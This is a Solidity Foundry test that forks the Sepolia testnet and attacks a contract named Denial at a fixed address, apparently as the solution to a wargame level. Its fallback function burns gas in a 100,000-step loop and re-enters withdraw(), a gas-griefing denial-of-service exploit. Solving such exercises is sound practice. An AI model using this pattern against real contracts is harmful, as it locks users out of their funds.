// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Denial} from "../src/Denial.sol";

contract DenialTest is Test {
    function setUp() public {
        vm.createSelectFork("https://ethereum-sepolia-rpc.publicnode.com", 6676069);
    }

    function test_Withdraw() public {
        Denial denial = Denial(payable(0x3a28d7D984dDe34D9815C13Bd8800527779BE2F6));

        denial.setWithdrawPartner(address(this));

        denial.withdraw();
    }

    fallback() external payable {
        uint256 sum = 0;
        for(uint256 i = 0; i < 100000; i++) {
            sum += i;
        }

        Denial denial = Denial(payable(0x3a28d7D984dDe34D9815C13Bd8800527779BE2F6));

        denial.withdraw();
    }

}
